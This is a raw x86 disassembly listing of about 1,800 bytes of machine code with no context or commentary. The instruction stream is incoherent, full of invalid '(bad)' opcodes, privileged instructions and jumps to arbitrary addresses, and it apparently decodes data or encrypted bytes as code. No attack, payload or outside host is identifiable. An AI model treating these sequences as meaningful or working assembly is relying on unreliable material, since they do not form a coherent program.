  410900:	mov    eax,0xb0a864fe
  410905:	je     0x410940
  410907:	enter  0x6002,0x0
  41090b:	(bad)  
  41090d:	mov    al,0x74
  41090f:	cmp    eax,0x44ff033a
  410914:	pop    esp
  410915:	mov    al,0x74
  410917:	leave  
  410918:	enter  0xfd39,0xbe
  41091c:	ja     0x4108ce
  41091e:	je     0x4108d9
  410920:	js     0x410946
  410922:	gs scas al,BYTE PTR es:[edi]
  410924:	xchg   DWORD PTR [ebx+0x0],ebp
  410927:	xor    DWORD PTR [eax+0x3834eb02],esi
  41092d:	add    al,0x0
  41092f:	xor    DWORD PTR [eax-0x4fde3e47],esi
  410935:	push   ebp
  410936:	mov    edx,DWORD PTR [ebp+0x297c8506]
  41093c:	mov    al,0x35
  41093e:	add    eax,0x3c5d8d7
  410943:	xor    DWORD PTR [ebx],ebx
  410945:	aaa    
  410946:	or     BYTE PTR [edx-0x56],bl
  410949:	scas   eax,DWORD PTR es:[edi]
  41094a:	xor    eax,0xff26f849
  41094f:	push   esi
  410950:	xor    ecx,edx
  410952:	add    esi,DWORD PTR [edx+0x407502a6]
  410958:	fbstp  TBYTE PTR [esi]
  41095a:	or     BYTE PTR [ecx+0x8],cl
  41095d:	daa    
  41095e:	push   DWORD PTR [esi]
  410960:	or     edi,eax
  410962:	mov    edx,0x56e90cf0
  410967:	mov    edx,0x294761b4
  41096c:	xchg   edx,eax
  41096d:	mov    bl,0xff
  41096f:	add    BYTE PTR [ebx-0x727aa6f4],ch
  410975:	stc    
  410976:	call   0x9bd337b2
  41097b:	adc    edi,esi
  41097d:	fcomp  DWORD PTR [ebp+0x6]
  410980:	mov    dl,0x23
  410982:	std    
  410983:	add    esp,DWORD PTR [ebp+0x11]
  410986:	jb     0x4109de
  410988:	cmp    eax,0xae0858a6
  41098d:	or     ch,BYTE PTR [edx+0x2e]
  410990:	cmp    DWORD PTR [ecx],ecx
  410992:	cmp    eax,0xe13bbbfb
  410997:	push   ebx
  410998:	mov    dh,0xa
  41099a:	push   0x5
  41099c:	sub    eax,edx
  41099e:	stos   BYTE PTR es:[edi],al
  41099f:	pop    ss
  4109a0:	xor    DWORD PTR [edx+esi*2],edi
  4109a3:	lahf   
  4109a4:	mov    bl,0xcc
  4109a6:	mov    esp,0x2b91ff58
  4109ab:	adc    al,0x76
  4109ad:	or     cl,ch
  4109af:	add    esi,DWORD PTR [ecx]
  4109b1:	or     DWORD PTR [edx+0x46],esi
  4109b4:	cmp    eax,0x3103e8ce
  4109b9:	or     ecx,ebp
  4109bb:	test   ch,bh
  4109bd:	adc    cl,ch
  4109bf:	ss sub edx,esi
  4109c2:	sub    BYTE PTR [ecx+0xe],dl
  4109c5:	shr    BYTE PTR [edx],1
  4109c7:	jmp    DWORD PTR [esi-0x5a]
  4109ca:	(bad)  
  4109cc:	push   esi
  4109cd:	jnp    0x41097b
  4109cf:	mov    al,0x57
  4109d1:	adc    DWORD PTR [ecx],ebp
  4109d3:	add    BYTE PTR ss:[ecx],bh
  4109d6:	repnz sub BYTE PTR [ecx-0x1a],dl
  4109da:	iret   
  4109db:	jmp    FWORD PTR [edx]
  4109dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109df:	xchg   DWORD PTR [edx+ecx*4-0x350e8b5a],esp
  4109e6:	outs   dx,DWORD PTR ds:[esi]
  4109e7:	pop    ebp
  4109e8:	push   ds
  4109e9:	loope  0x4109b6
  4109eb:	inc    esp
  4109ec:	sbb    eax,0xe9000933
  4109f1:	xchg   edi,eax
  4109f2:	dec    ebp
  4109f3:	in     al,dx
  4109f4:	cdq    
  4109f5:	(bad)  
  4109f6:	dec    ebp
  4109f7:	hlt    
  4109f8:	cdq    
  4109f9:	rcr    DWORD PTR ds:0xa2d90108,0xfe
  410a00:	out    dx,al
  410a01:	or     BYTE PTR [esi-0x14],cl
  410a04:	pop    esi
  410a05:	jmp    0x41098e
  410a07:	jl     0x4109de
  410a09:	sub    eax,0xe2041d
  410a0e:	sbb    DWORD PTR [eax],ecx
  410a10:	add    ch,ch
  410a12:	inc    esi
  410a13:	pop    edi
  410a14:	mov    al,0xf3
  410a16:	adc    BYTE PTR [eax],al
  410a18:	adc    bh,BYTE PTR [eax-0x4b]
  410a1b:	mov    BYTE PTR [ebx*4+0x2dc17c89],ch
  410a22:	or     DWORD PTR [eax+0x2b1164e9],esp
  410a28:	test   eax,0xabc943f7
  410a2d:	xor    DWORD PTR [ecx],ecx
  410a2f:	mov    esp,DWORD PTR [esi*4-0x1d142037]
  410a36:	mov    al,0x67
  410a38:	add    eax,0x88a3d600
  410a3d:	sub    al,0xc1
  410a3f:	(bad)  
  410a40:	mul    DWORD PTR [esi-0x17005318]
  410a46:	xor    cl,BYTE PTR [ecx]
  410a48:	jmp    0x410a64
  410a4a:	mov    al,0x4d
  410a4c:	lock mov ecx,0xb9f44db1
  410a52:	xchg   DWORD PTR ds:0xf3e00008,ebx
  410a58:	stc    
  410a59:	inc    DWORD PTR [edi]
  410a5b:	and    BYTE PTR [eax+esi*8+0x43],cl
  410a5f:	dec    ecx
  410a60:	call   0xd0e056dc
  410a65:	je     0x410a8f
  410a67:	jae    0x410adc
  410a69:	cld    
  410a6a:	inc    eax
  410a6b:	adc    al,0x64
  410a6d:	inc    DWORD PTR [edi-0x40]
  410a70:	mov    esi,0xc064c75e
  410a75:	or     al,0x18
  410a77:	lds    ecx,FWORD PTR [ebx-0x18]
  410a7a:	pop    es
  410a7b:	push   ecx
  410a7c:	in     al,0xab
  410a7e:	mov    ebx,edx
  410a80:	out    0x0,eax
  410a82:	jle    0x410a92
  410a84:	cmp    DWORD PTR [ebp+0xc],0x8
  410a88:	jne    0x410a4b
  410a8a:	pop    ebx
  410a8b:	(bad)  
  410a8d:	add    BYTE PTR [ebp+0xb],bh
  410a90:	cmp    DWORD PTR [ebp-0x4],0x7
  410a94:	jne    0x410aa6
  410a96:	mul    eax
  410a98:	sti    
  410a99:	call   0x3ff126
  410a9e:	add    BYTE PTR [ebx],dh
  410aa0:	int    0x5c
  410aa2:	pop    edi
  410aa3:	xchg   ecx,eax
  410aa4:	leave  
  410aa5:	or     al,BYTE PTR [eax]
  410aa7:	sbb    ebx,ecx
  410aa9:	jecxz  0x410aab
  410aab:	cmp    eax,0x888be912
  410ab0:	pop    es
  410ab1:	add    BYTE PTR [ebx+0x75fefd4d],cl
  410ab7:	mov    esp,0x4d8aff22
  410abc:	jno    0x410a7d
  410abe:	loopne 0x410a4a
  410ac0:	aaa    
  410ac1:	call   0xfdb536a6
  410ac6:	mov    DWORD PTR [ebp+0x247d89d3],ebx
  410acc:	pop    ds
  410acd:	je     0x410acb
  410acf:	xor    DWORD PTR [edi+0x4b],eax
  410ad2:	lods   eax,DWORD PTR ds:[esi]
  410ad3:	stos   BYTE PTR es:[edi],al
  410ad4:	loope  0x410a9b
  410ad6:	inc    esp
  410ad7:	push   ecx
  410ad8:	mov    cl,0x2
  410ada:	add    BYTE PTR [ecx],dh
  410adc:	xor    eax,0x2ce1e048
  410ae1:	dec    eax
  410ae2:	hlt    
  410ae3:	loope  0x410b64
  410ae5:	lods   eax,DWORD PTR ds:[esi]
  410ae6:	je     0x410b21
  410ae8:	clc    
  410ae9:	popf   
  410aea:	cli    
  410aeb:	es add al,0xfa
  410aee:	mov    edi,0x7c81aca5
  410af3:	sbb    eax,0xb20636b1
  410af8:	lea    esp,[edx-0x7e358201]
  410afe:	jl     0x410b11
  410b00:	mov    cl,0x36
  410b02:	or     BYTE PTR [eax],al
  410b04:	neg    BYTE PTR ds:0x4fb4e7a3
  410b0a:	lods   eax,DWORD PTR ds:[esi]
  410b0b:	(bad)  
  410b0c:	out    0x3d,al
  410b0e:	shl    bh,1
  410b10:	or     edi,DWORD PTR [edx+0x3dd6feac]
  410b16:	mov    al,0xe7
  410b18:	inc    esp
  410b19:	dec    edi
  410b1a:	lods   eax,DWORD PTR ds:[esi]
  410b1b:	(bad)  
  410b1c:	sbb    dh,BYTE PTR [eax+0x4d]
  410b1f:	pop    edi
  410b20:	call   0xab410a93
  410b25:	in     eax,dx
  410b26:	mov    ds:0xa7ddaeaa,eax
  410b2b:	and    BYTE PTR [esp+ecx*4],0x3
  410b2f:	je     0x410b68
  410b31:	das    
  410b32:	das    
  410b33:	hlt    
  410b34:	xor    ebp,edi
  410b36:	(bad)
  410b3a:	stos   DWORD PTR es:[edi],eax
  410b3b:	je     0x410ba2
  410b3d:	xor    eax,DWORD PTR [edi+edi*8]
  410b40:	add    al,0x1c
  410b42:	pushf  
  410b43:	dec    ecx
  410b44:	adc    dh,BYTE PTR [ebx]
  410b46:	lods   eax,DWORD PTR ds:[esi]
  410b47:	mov    bh,0x30
  410b49:	or     ecx,ebp
  410b4b:	add    esi,DWORD PTR [ecx]
  410b4d:	inc    ebx
  410b4e:	mov    esi,0xe91570ba
  410b53:	push   esi
  410b54:	stos   BYTE PTR es:[edi],al
  410b55:	mov    ch,0x69
  410b57:	enter  0x3a76,0x6a
  410b5b:	das    
  410b5c:	and    DWORD PTR [ecx],ecx
  410b5e:	mov    ah,0xf9
  410b60:	xchg   BYTE PTR [eax],cl
  410b62:	jmp    0x20833c6a
  410b67:	ret    0x4200
  410b6a:	or     DWORD PTR [esi],esp
  410b6c:	aas    
  410b6d:	inc    ecx
  410b6e:	out    dx,al
  410b6f:	cmp    bh,BYTE PTR [ecx+0x75]
  410b72:	stc    
  410b73:	sbb    eax,0xa793a2e7
  410b78:	add    edi,DWORD PTR [eax+0x3119f94b]
  410b7e:	mov    ds:0x1bffb373,al
  410b83:	loope  0x410b20
  410b85:	lds    edi,FWORD PTR [esi]
  410b87:	out    dx,al
  410b88:	lods   al,BYTE PTR ds:[esi]
  410b89:	mov    bl,0x23
  410b8b:	stc    
  410b8c:	add    ebx,DWORD PTR [ebp+edx*1+0x53]
  410b90:	add    ecx,DWORD PTR [ebx+0x2d]
  410b93:	(bad)  
  410b94:	sub    DWORD PTR ss:[ecx-0x5e31b68f],esi
  410b9b:	lds    esi,FWORD PTR [esi]
  410b9d:	sbb    eax,0xd6fc33a2
  410ba2:	xchg   esi,eax
  410ba3:	adc    ebp,DWORD PTR [ebp-0x4fdc7049]
  410ba9:	scas   eax,DWORD PTR es:[edi]
  410baa:	sbb    edi,ebp
  410bac:	lods   al,BYTE PTR ds:[esi]
  410bad:	sbb    eax,0xfd749111
  410bb2:	mov    eax,ds:0xfd1dac95
  410bb7:	lea    esi,[esi]
  410bb9:	cmp    DWORD PTR [ecx-0x5e79b1ac],esi
  410bbf:	outs   dx,DWORD PTR ds:[esi]
  410bc0:	inc    esi
  410bc1:	jns    0x410b64
  410bc3:	(bad)  
  410bc4:	sti    
  410bc5:	push   ds
  410bc6:	mov    ds:0x83cae174,al
  410bcb:	pop    esp
  410bcc:	data16 add BYTE PTR [ebp-0x720a8b5e],dl
  410bd3:	sbb    al,0x8
  410bd5:	inc    ecx
  410bd6:	jb     0x410c1c
  410bd8:	dec    DWORD PTR [esi-0x37]
  410bdb:	dec    esp
  410bdc:	adc    al,0x6a
  410bde:	pop    edx
  410bdf:	mov    eax,ds:0x24b1ed72
  410be4:	cld    
  410be5:	in     al,0xfe
  410be7:	adc    eax,DWORD PTR [ebx+0x7405deac]
  410bed:	out    dx,al
  410bee:	or     DWORD PTR [ecx+0x5e],esp
  410bf1:	xor    al,dh
  410bf3:	cld    
  410bf4:	inc    DWORD PTR [edi+0x5e]
  410bf7:	pop    DWORD PTR [eax-0x17]
  410bfa:	jecxz  0x410ba4
  410bfc:	cmp    BYTE PTR [edx+ebx*8-0xd2df8ea],ch
  410c03:	aas    
  410c04:	leave  
  410c05:	sub    ebx,DWORD PTR [esi]
  410c07:	or     DWORD PTR [ebx+0x75059e6c],eax
  410c0d:	neg    DWORD PTR [ebx+0x20de1415]
  410c13:	adc    eax,ebp
  410c15:	add    DWORD PTR [eax-0x60],ebp
  410c18:	(bad)  
  410c19:	pusha  
  410c1a:	jo     0x410bed
  410c1c:	addr16 jmp 0xd1411654
  410c22:	mov    bl,0x2a
  410c24:	push   DWORD PTR [esi+0x2f44534]
  410c2a:	fidiv  DWORD PTR [ebx-0xa9f59ef]
  410c30:	(bad)  
  410c31:	adc    al,0x0
  410c33:	popf   
  410c34:	test   al,0x34
  410c36:	xor    al,0xca
  410c38:	lahf   
  410c39:	mov    dh,BYTE PTR [ecx+eax*8]
  410c3c:	xchg   ecx,eax
  410c3d:	add    eax,DWORD PTR [eax]
  410c3f:	repnz dec ebx
  410c41:	cmp    edi,DWORD PTR [ebp-0x50]
  410c44:	xlat   BYTE PTR ds:[ebx]
  410c45:	call   0x833a51d5
  410c4a:	cmp    BYTE PTR [eax-0x27],bl
  410c4d:	push   cs
  410c4e:	inc    DWORD PTR [ebp+0x6a41e670]
  410c54:	jae    0x410c53
  410c56:	sub    ecx,DWORD PTR [eax]
  410c58:	push   esp
  410c59:	leave  
  410c5a:	ret    0xc44
  410c5d:	cmp    DWORD PTR [ebp-0x14],0x9
  410c61:	jne    0x41121e
  410c67:	xor    esi,DWORD PTR [ecx+ebp*8+0x6e]
  410c6b:	xchg   ebx,eax
  410c6c:	cmp    dh,ah
  410c6e:	mov    edx,DWORD PTR [esi+ebp*1]
  410c71:	add    al,BYTE PTR [ebp+0x38]
  410c74:	(bad)  
  410c75:	dec    DWORD PTR [edi+0x3f]
  410c78:	fiadd  DWORD PTR [edi]
  410c7a:	call   0x405ae2
  410c7f:	das    
  410c80:	ficom  DWORD PTR [ebx]
  410c82:	inc    DWORD PTR [ebp-0x6346195c]
  410c88:	jb     0x410c87
  410c8a:	mov    DWORD PTR [ebp-0x30ff97a9],edx
  410c90:	fcom   DWORD PTR [ebx]
  410c92:	inc    DWORD PTR [ebp+0x49e69d]
  410c98:	add    BYTE PTR [ebx-0x3],dh
  410c9b:	mov    ebp,DWORD PTR ds:0xd83982f9
  410ca1:	fmul   DWORD PTR [esi]
  410ca3:	inc    DWORD PTR ds:0x69ede659
  410ca9:	je     0x410ca8
  410cab:	sub    ebx,eax
  410cad:	push   edx
  410cae:	leave  
  410caf:	ret    0xba4
  410cb2:	push   DWORD PTR [ebp+0x30]
  410cb5:	je     0x410d2a
  410cb7:	adc    al,0x31
  410cb9:	ja     0x410cea
  410cbb:	int3   
  410cbc:	mov    ?,esp
  410cbe:	idiv   esi
  410cc0:	cld    
  410cc1:	cdq    
  410cc2:	call   0x710a:0xaa1e7f92
  410cc9:	pushf  
  410cca:	stc    
  410ccb:	(bad)  
  410ccc:	in     al,0x15
  410cce:	fwait
  410ccf:	(bad)
  410cd2:	stos   BYTE PTR es:[edi],al
  410cd3:	sub    dh,BYTE PTR [ecx+0x5e]
  410cd6:	mov    ebx,0x41b23dc1
  410cdb:	cmp    ecx,esp
  410cdd:	cmp    DWORD PTR ds:0xa5c468d,esi
  410ce3:	inc    esp
  410ce5:	mov    ch,0xa9
  410ce7:	je     0x410d52
  410ce9:	(bad)  
  410cea:	das    
  410ceb:	or     al,0x2e
  410ced:	push   esi
  410cee:	cli    
  410cef:	out    0x8f,eax
  410cf1:	out    0xa9,al
  410cf3:	(bad)  
  410cf4:	sub    dh,al
  410cf6:	stc    
  410cf7:	test   BYTE PTR [ebx+0x2b1],al
  410cfd:	push   cs
  410cfe:	jbe    0x410cae
  410d00:	out    0x9c,eax
  410d02:	xchg   ecx,eax
  410d03:	test   eax,0x49f04afe
  410d08:	leave  
  410d09:	repz mov esp,0xb12fe902
  410d0f:	add    al,BYTE PTR [eax]
  410d11:	mov    dl,0x25
  410d13:	test   al,0xc
  410d15:	cs and eax,0xb03100f0
  410d1b:	(bad)  
  410d1d:	fadd   DWORD PTR [ebx+eax*1]
  410d20:	add    BYTE PTR [ecx],dh
  410d22:	sbb    ecx,DWORD PTR [edi-0xc]
  410d25:	stos   BYTE PTR es:[edi],al
  410d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d27:	ins    BYTE PTR es:[edi],dx
  410d28:	add    ch,BYTE PTR [eax+eiz*2+0x1d]
  410d2c:	add    BYTE PTR [ecx],al
  410d2e:	outs   dx,DWORD PTR ds:[esi]
  410d2f:	or     BYTE PTR cs:[ecx-0x61b511f7],bl
  410d36:	sahf   
  410d37:	adc    al,BYTE PTR [esi+edx*4]
  410d3a:	adc    al,0xfd
  410d3c:	test   al,0x5
  410d3e:	adc    DWORD PTR [ecx-0x7a61809b],eax
  410d44:	jge    0x410d33
  410d46:	hlt    
  410d47:	imul   ebp,ebx,0xa8e61576
  410d4d:	in     eax,0x94
  410d4f:	add    BYTE PTR [ecx-0x30],0x9d
  410d53:	fstp   QWORD PTR gs:[esi+0x42c6303e]
  410d5a:	or     edx,esp
  410d5c:	aad    0xc2
  410d5e:	add    eax,DWORD PTR [eax-0x68]
  410d61:	add    BYTE PTR [esi-0x62],al
  410d64:	call   0xd2ee02e3
  410d69:	add    esi,DWORD PTR [esi]
  410d6b:	adc    al,0xdd
  410d6d:	test   al,0xa5
  410d6f:	adc    DWORD PTR [ecx+0x35],eax
  410d72:	push   ds
  410d73:	sahf   
  410d74:	and    eax,0x69f56d7d
  410d79:	jmp    0x410d91
  410d7b:	adc    eax,0x9585a8e6
  410d80:	add    BYTE PTR [ecx],dl
  410d82:	nop
  410d83:	sahf   
  410d84:	add    eax,0x303dbedd
  410d89:	(bad)  
  410d8a:	and    cl,BYTE PTR [ecx]
  410d8c:	imul   dh
  410d8e:	bound  ecx,QWORD PTR [edi+0x43b603a7]
  410d94:	sar    DWORD PTR [ebp+esi*2-0x4f],1
  410d98:	imul   ebx,DWORD PTR [ebx-0x13737d6],0xa88fbb1b
  410da2:	(bad)  
  410da3:	popf   
  410da4:	call   0xd0cacf59
  410da9:	adc    BYTE PTR [eax-0x4a36ffbd],ch
  410daf:	sub    al,0xe8
  410db1:	or     ah,BYTE PTR [eax*2-0x4ea01d14]
  410db8:	jbe    0x410da5
  410dba:	mov    ch,0xf0
  410dbc:	sub    bh,BYTE PTR [ebx-0x3d13baf3]
  410dc2:	inc    edi
  410dc3:	test   eax,0x9d00348a
  410dc8:	mov    al,al
  410dca:	retf   0xb0ad
  410dcd:	add    edi,DWORD PTR [esi-0x5d]
  410dd0:	or     dl,BYTE PTR [ebp-0x77]
  410dd3:	jmp    0x410e09
  410dd5:	in     al,0x72
  410dd7:	pop    ds
  410dd8:	mov    cl,0x3a
  410dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ddb:	mov    dh,0x1a
  410ddd:	add    eax,0xeaa90f62
  410de2:	jmp    0xf50f:0x46e444c5
  410de9:	(bad)  
  410dea:	mov    ah,0x9e
  410dec:	dec    ebp
  410ded:	(bad)  
  410dee:	mov    esp,0x36a0a52a
  410df3:	fstp   DWORD PTR [ebx+0xc4f290a]
  410df9:	call   DWORD PTR [esi+eax*8-0x2676635c]
  410e00:	fwait
  410e01:	sub    ch,BYTE PTR [ecx]
  410e03:	jns    0x410dd7
  410e05:	rcr    ebp,0x32
  410e08:	xchg   edx,eax
  410e09:	inc    esp
  410e0a:	sbb    eax,0xac8ccc75
  410e0f:	dec    BYTE PTR [ebp+ecx*4-0x5c]
  410e13:	cli    
  410e14:	dec    esp
  410e15:	push   edx
  410e16:	shr    DWORD PTR [ebx+0x54defe9f],1
  410e1c:	inc    ebp
  410e1d:	rcl    dh,1
  410e1f:	add    BYTE PTR [ebp-0x63892919],bh
  410e25:	inc    BYTE PTR [eax]
  410e27:	dec    ebx
  410e28:	repnz iret 
  410e2a:	add    BYTE PTR [eax],al
  410e2c:	cld    
  410e2d:	adc    DWORD PTR [ebx+0x7405c07d],eax
  410e33:	pop    ss
  410e34:	xlat   BYTE PTR ds:[ebx]
  410e35:	fcmovbe st,st(3)
  410e37:	(bad)  
  410e38:	cmp    eax,0x8475fdcd
  410e3d:	arpl   WORD PTR [ebx+0x8],si
  410e40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e41:	cmp    bl,BYTE PTR [eax]
  410e43:	call   FWORD PTR ds:0xb302e6cd
  410e49:	fs std 
  410e4b:	inc    edi
  410e4c:	jae    0x410e3f
  410e4e:	test   DWORD PTR [edi],0xfffcb7da
  410e54:	xlat   BYTE PTR ds:[ebx]
  410e55:	arpl   WORD PTR [ebx-0xc],si
  410e58:	add    BYTE PTR [eax+0x60],cl
  410e5b:	push   edi
  410e5d:	sub    al,0x0
  410e5f:	add    BYTE PTR [eax+0x8],bl
  410e62:	pop    edi
  410e63:	leave  
  410e64:	sbb    bh,cl
  410e66:	call   DWORD PTR [ebx+eax*8-0x80]
  410e6a:	push   ebp
  410e6b:	(bad)  
  410e6c:	jge    0x410e0e
  410e6e:	out    0xd2,al
  410e70:	mul    BYTE PTR [edx-0x3]
  410e73:	push   0x40e934
  410e78:	push   edi
  410e79:	fiadd  DWORD PTR [edi]
  410e7b:	call   0x40f01c
  410e80:	adc    ecx,eax
  410e82:	jae    0x410e89
  410e84:	xlat   BYTE PTR ds:[ebx]
  410e85:	pop    esp
  410e86:	ror    BYTE PTR [eax],0x8
  410e89:	pop    esi
  410e8a:	(bad)  
  410e8b:	push   edi
  410e8d:	fadd   DWORD PTR [edi]
  410e8f:	call   0xff343794
  410e94:	call   DWORD PTR [edi]
  410e96:	ret    
  410e97:	bound  eax,QWORD PTR [ecx-0x38]
  410e9a:	bound  esi,QWORD PTR [ebx+0x8]
  410e9d:	pop    ds
  410e9e:	jge    0x410f14
  410ea0:	dec    ebx
  410ea1:	xor    DWORD PTR [edx+0x34f10b02],esi
  410ea7:	add    DWORD PTR [edi-0x18],ebx
  410eaa:	outs   dx,DWORD PTR ds:[esi]
  410eab:	cli    
  410eac:	(bad)  
  410ead:	mov    edx,0xaeb8c29e
  410eb2:	push   edx
  410eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eb4:	(bad)  
  410eb5:	mov    ds:0x2406eb1b,eax
  410eba:	xchg   edx,eax
  410ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ebc:	je     0x410ee7
  410ebe:	jp     0x410f2f
  410ec0:	dec    ecx
  410ec1:	xor    DWORD PTR [edx-0x5b034007],esi
  410ec7:	inc    ebp
  410ec8:	leave  
  410ec9:	jae    0x410e64
  410ecb:	add    ch,BYTE PTR [eax+0x27]
  410ece:	add    eax,0x9c6e0045
  410ed3:	cli    
  410ed4:	out    0xf0,eax
  410ed6:	out    0x3,al
  410ed8:	add    BYTE PTR [edx],ch
  410eda:	repnz das 
  410edc:	or     DWORD PTR [esi-0x4c],edx
  410edf:	test   BYTE PTR [esi+0x4074b634],0x31
  410ee6:	retf   0x650b
  410ee9:	lock mov cl,0xa5
  410eec:	je     0x410f17
  410eee:	cmp    bl,dh
  410ef0:	dec    edx
  410ef1:	xor    DWORD PTR [eax-0x63ff4007],esi
  410ef7:	test   eax,0x132d74a5
  410efc:	add    BYTE PTR [eax+0x680271a7],al
  410f02:	pop    ecx
  410f03:	lea    eax,[ebx+0x0]
  410f06:	push   es
  410f07:	jbe    0x410f03
  410f09:	out    0x2c,eax
  410f0b:	push   edi
  410f0c:	add    al,BYTE PTR [eax]
  410f0e:	sub    dh,al
  410f10:	das    
  410f11:	or     esi,ebp
  410f13:	sbb    eax,0x242c8ef7
  410f18:	jne    0x410f5a
  410f1a:	xor    DWORD PTR [ecx],ecx
  410f1c:	mov    eax,ds:0xe9093103
  410f21:	inc    esp
  410f22:	clc    
  410f23:	(bad)  
  410f24:	loopne 0x410f29
  410f26:	pop    esp
  410f27:	mov    ?,WORD PTR [ecx+eax*4+0x4d1e95f2]
  410f2e:	dec    ecx
  410f2f:	rol    DWORD PTR [ebx+eax*2+0x31],0x9a
  410f34:	cmp    edi,esp
  410f36:	mov    ?,WORD PTR [ecx+eiz*1-0x56f1cefc]
  410f3d:	das    
  410f3e:	das    
  410f3f:	cmp    bh,BYTE PTR [edi]
  410f41:	mov    ebx,0x43e90570
  410f46:	mov    edx,0x29276199
  410f4b:	scas   al,BYTE PTR es:[edi]
  410f4c:	out    0x5f,eax
  410f4e:	neg    dl
  410f50:	call   0xa67a83
  410f55:	retf   0x47d2
  410f58:	jmp    0x11261001
  410f5d:	push   ecx
  410f5e:	ins    DWORD PTR es:[edi],dx
  410f5f:	jmp    0x410f69
  410f61:	jmp    0xef559e5e
  410f66:	inc    esp
  410f67:	out    0xcf,eax
  410f69:	sub    al,BYTE PTR [eax]
  410f6b:	xor    DWORD PTR [esi-0x18b4043d],ecx
  410f71:	push   0xd01539e5
  410f76:	and    DWORD PTR [edi+0xc],0xffffffb5
  410f7a:	cmpxchg ecx,ebx
  410f7d:	repnz das 
  410f7f:	es mov ebp,ebx
  410f82:	dec    eax
  410f83:	test   DWORD PTR [edi],ecx
  410f85:	imul   esp,ebp,0x83e41565
  410f8b:	aas    
  410f8c:	sub    DWORD PTR [eax+eax*1-0x11],edi
  410f90:	add    ecx,ecx
  410f92:	cmp    al,0xb1
  410f94:	fcos   
  410f96:	call   0xa507cfb2
  410f9b:	xchg   esi,eax
  410f9c:	cdq    
  410f9d:	(bad)  
  410f9e:	jmp    0xe185d1d5
  410fa3:	xor    cl,BYTE PTR [ecx]
  410fa5:	add    cl,ch
  410fa7:	dec    ecx
  410fa8:	sbb    eax,0x88f9c208
  410fad:	ds push cs
  410faf:	push   es
  410fb0:	out    dx,al
  410fb1:	cmp    BYTE PTR [ecx+ebx*8],0x99
  410fb5:	jae    0x410f92
  410fb7:	aad    0x44
  410fb9:	clc    
  410fba:	call   0x1c4118f1
  410fbf:	add    BYTE PTR [ecx],ch
  410fc1:	ret    0x9d44
  410fc4:	xor    ecx,DWORD PTR [ecx]
  410fc6:	add    cl,ch
  410fc8:	test   eax,0xcd24f6f6
  410fcd:	or     BYTE PTR [eax],al
  410fcf:	jmp    0xa74b2406
  410fd4:	ins    DWORD PTR es:[edi],dx
  410fd5:	stc    
  410fd6:	(bad)  
  410fd7:	sub    al,0x99
  410fd9:	cdq    
  410fda:	(bad)  
  410fdb:	jmp    0xc57f9912
  410fe0:	pop    es
  410fe1:	add    al,0xff
  410fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fe4:	call   0xffa1:0x72e06ae
  410feb:	call   0xc4c41922
  410ff0:	mov    cs,WORD PTR [eax]
  410ff2:	jne    0x410fde
  410ff4:	in     al,dx
  410ff5:	mov    esi,cr5
  410ff8:	mov    dl,0xd7
  410ffa:	push   DWORD PTR [ebx-0xe837c5e]
  411000:	mov    ecx,0x12de7ff4
  411005:	push   ds
  411006:	push   ss
  411007:	imul   ecx,DWORD PTR [ebp+0xa],0x40229420
  41100e:	jmp    0x411010
  411010:	push   es
  411011:	adc    eax,DWORD PTR [esi+0x1]
  411014:	pusha  
  411015:	xchg   ebp,eax
  411016:	inc    ebp
  411017:	sbb    BYTE PTR [edi-0x500a8af4],0xdd
  41101e:	inc    esi
  41101f:	or     BYTE PTR [edi],0xd
  411022:	jne    0x411003
  411024:	add    BYTE PTR [edi-0x27ff0bbe],dl
  41102a:	or     al,0x0
  41102c:	mov    esp,DWORD PTR [ebp+0x5]
  41102f:	mov    edi,DWORD PTR [ebp-0x40]
  411032:	and    BYTE PTR [bx+si-0x5751],al
  411037:	jae    0x411055
  411039:	(bad)  
  41103a:	add    al,0x0
  41103c:	jmp    DWORD PTR [ebp+0x71]
  41103f:	push   esp
  411040:	call   0x3e7ac8
  411045:	or     esp,0x73
  411048:	push   es
  411049:	aas    
  41104a:	dec    ebx
  41104b:	leave  
  41104c:	ret    0xc94
  41104f:	mov    esi,edi
  411051:	inc    esi
  411052:	ins    BYTE PTR es:[edi],dx
  411053:	inc    ebx
  411054:	hlt    
  411055:	pop    ss
  411056:	lea    edi,ds:0xfd556500
  41105c:	jne    0x411042
  41105e:	shl    bh,cl
  411060:	or     al,0xce
  411062:	imul   edi,ebp,0x5f
  411065:	mov    es,ebp
  411067:	rol    BYTE PTR [eax+ebx*2],0xd1
  41106b:	mov    ch,ah
  41106d:	retf   
  41106e:	rol    dh,0x56
  411071:	xchg   edi,eax
  411072:	(bad)  
  411073:	jnp    0x411089
  411075:	sbb    BYTE PTR [eax],al
  411077:	or     DWORD PTR [ebx+0x414a1c1d],eax
  41107d:	or     BYTE PTR [esi*2-0x36b610fa],cl
  411084:	ret    0xc08
  411087:	mov    eax,DWORD PTR [ebp+0x0]
  41108a:	xor    DWORD PTR [esi+0x387d04db],edx
  411090:	inc    ebp
  411091:	add    BYTE PTR [esi],ah
  411093:	and    esp,DWORD PTR [edi+0x0]
  411096:	xor    DWORD PTR [edx+0x2fb104db],esp
  41109c:	inc    ebp
  41109d:	add    BYTE PTR [esi],ch
  41109f:	and    edi,DWORD PTR [ebx+0x0]
  4110a2:	xor    DWORD PTR [edx+0x27b504db],esp
  4110a8:	inc    esp
  4110a9:	add    BYTE PTR [esi],dh
  4110ab:	and    ecx,DWORD PTR [esi-0x705dcf00]
  4110b1:	inc    esp
  4110b2:	mov    ebp,0xa94490f1
  4110b7:	icebp  
  4110b8:	nop
  4110b9:	inc    esp
  4110ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110bb:	icebp  
  4110bc:	mov    ds:0x44381d34,al
  4110c1:	add    BYTE PTR [esi-0x30180c0c],dl
  4110c7:	imul   esp,DWORD PTR [ecx-0x541b4b02],0xafecac4f
  4110d1:	dec    edi
  4110d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d3:	in     al,0x93
  4110d5:	dec    edi
  4110d6:	outs   dx,BYTE PTR ds:[esi]
  4110d7:	pop    esp
  4110d8:	xchg   BYTE PTR [ebp+0x74a1a1f0],cl
  4110de:	inc    ecx
  4110df:	mov    ah,BYTE PTR [esi-0x9]
